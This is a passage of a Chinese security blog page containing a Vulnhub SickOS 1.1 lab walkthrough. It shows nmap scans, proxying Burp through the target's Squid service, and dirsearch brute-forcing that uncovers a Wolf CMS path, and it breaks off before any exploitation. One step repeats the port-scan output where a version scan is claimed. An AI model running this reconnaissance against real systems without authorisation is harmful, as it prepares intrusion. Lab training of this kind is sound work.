<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/e3722a685bf8da82.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e3722a685bf8da82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c63903712a141bbb.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-bb6c42847cbf8692.js" defer=""></script><script src="/_next/static/rBOAoH_mNY0kmuqb3_RcF/_buildManifest.js" defer=""></script><script src="/_next/static/rBOAoH_mNY0kmuqb3_RcF/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubSickOS 1 1","contentHtml":"\u003ch1\u003eSickOS 1.1\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/sickos-11,132/\"\u003ehttps://www.vulnhub.com/entry/sickos-11,132/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e136\u003c/code\u003e是靶机，因为靶机是我最后添加的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-22 11:36 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00038\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00031\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00049\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e:FB:\u003cspan class=\"hljs-number\"\u003e04\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00027\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:F8:B3:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eA (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.131\u003c/span\u003e\nHost is up.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描靶机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e \n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-22 11:41 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00075\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65532\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (no-response)\nPORT     STATE  SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   open   ssh\n\u003cspan class=\"hljs-number\"\u003e3128\u003c/span\u003e/tcp open   squid-http\n\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e/tcp closed http-proxy\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e:FB:\u003cspan class=\"hljs-number\"\u003e04\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e \n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-22 11:41 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00075\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65532\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (no-response)\nPORT     STATE  SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   open   ssh\n\u003cspan class=\"hljs-number\"\u003e3128\u003c/span\u003e/tcp open   squid-http\n\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e/tcp closed http-proxy\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e:FB:\u003cspan class=\"hljs-number\"\u003e04\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用脚本扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3128\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e -oA Desktop/test/vuln\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-22 11:46 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00085\u003c/span\u003es latency).\n\nPORT     STATE  SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   open   ssh\n\u003cspan class=\"hljs-number\"\u003e3128\u003c/span\u003e/tcp open   squid-http\n\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e/tcp closed http-proxy\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e:FB:\u003cspan class=\"hljs-number\"\u003e04\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e只有8080是关闭的，打开的只有\u003ccode\u003e3128\u003c/code\u003e 端口运行着squid代理服务和ssh，访问\u003ccode\u003e3128\u003c/code\u003e ，返回\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eERROR\nThe requested URL could not be retrieved\nThe following error was encountered \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e trying to retrieve the URL: /\n    Invalid URL\nSome aspect of the requested URL is incorrect.\nSome possible problems are:\n    Missing \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e incorrect access \u003cspan class=\"hljs-title function_ invoke__\"\u003eprotocol\u003c/span\u003e (should be \u003cspan class=\"hljs-string\"\u003e\"http://\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e similar)\n    Missing hostname\n    Illegal \u003cspan class=\"hljs-keyword\"\u003edouble\u003c/span\u003e-escape in the URL-Path\n    Illegal character in hostname; underscores are not allowed.\nYour cache administrator is webmaster.\nGenerated Sun, \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e Sep \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e03\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e GMT by \u003cspan class=\"hljs-title function_ invoke__\"\u003elocalhost\u003c/span\u003e (squid/\u003cspan class=\"hljs-number\"\u003e3.1\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可知版本是\u003ccode\u003e3.1.19\u003c/code\u003e ，因为他是个代理服务器，所以可能会代理着什么，可能就是\u003ccode\u003e80\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为我的火狐连接着的是burp的代理地址，假如想要再通过代理访问别的网站并且能抓包的话，就需要设置burp上游代理服务器\u003c/p\u003e\n\u003cp\u003e大概在：\u003ccode\u003enetwork-\u003econnection-\u003eupstreamserver\u003c/code\u003e 把代理地址\u003ccode\u003e192.168.75.136:3128\u003c/code\u003e 添加上去即可\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e访问\u003ccode\u003e192.168.75.136\u003c/code\u003e ，页面有回显了，那就表示\u003ccode\u003e80\u003c/code\u003e在\u003ccode\u003e192.168.75.136:3128\u003c/code\u003e 下代理着\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 内容\u003c/span\u003e\nBLEHHH!!! \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是个网路用词\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录，需要指定代理服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003epython .\\dirsearch.py -u http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.136 --proxy 192.168.75.136:3128\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e243\u003c/span\u003eB  - /cgi-bin/\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e109\u003c/span\u003eB  - /connect\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e239\u003c/span\u003eB  - /doc/\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e242\u003c/span\u003eB  - /doc/api/\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e247\u003c/span\u003eB  - /doc/html/index.html\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e249\u003c/span\u003eB  - /doc/en/changes.html\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e247\u003c/span\u003eB  - /doc/stable.version\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003eB  - /robots.txt\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e242\u003c/span\u003eB  - /server-status\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e242\u003c/span\u003eB  - /server-status/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现\u003ccode\u003erobots.txt\u003c/code\u003e以及\u003ccode\u003econnect\u003c/code\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003econnect\u003c/code\u003e内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/python\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"I Try to connect things very frequently\\n\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"You may want to try my services\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003erobots.txt\u003c/code\u003e 内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eUser-agent: *\nDisallow: /\nDissalow: /wolfcms\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e给我们提示\u003ccode\u003ewolfcms\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e访问\u003ccode\u003e/wolfcms\u003c/code\u003e ，是一个内容管理cms，爆破目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003epython .\\dirsearch.py -u http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.136/wolfcms --proxy 192.168.75.136:3128\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003eB  - /wolfcms/composer.json\n....\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eKB - /wolfcms/CONTRIBUTING.md\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e253\u003c/span\u003eB  - /wolfcms/docs  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.136/wolfcms/docs/\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003eB  - /wolfcms/docs/\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003eKB - /wolfcms/docs/updating.txt\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e894\u003c/span\u003eB  - /wolfcms/favicon.ico\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e257\u003c/span\u003eB  - /wolfcms/\u003cspan class=\"hljs-keyword\"\u003epublic\u003c/span\u003e  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.136/wolfcms/public/\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e462\u003c/span\u003eB  - /wolfcms/\u003cspan class=\"hljs-keyword\"\u003epublic\u003c/span\u003e/\n[\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003eKB - /wolfcms/README.md\n[\u003cspan 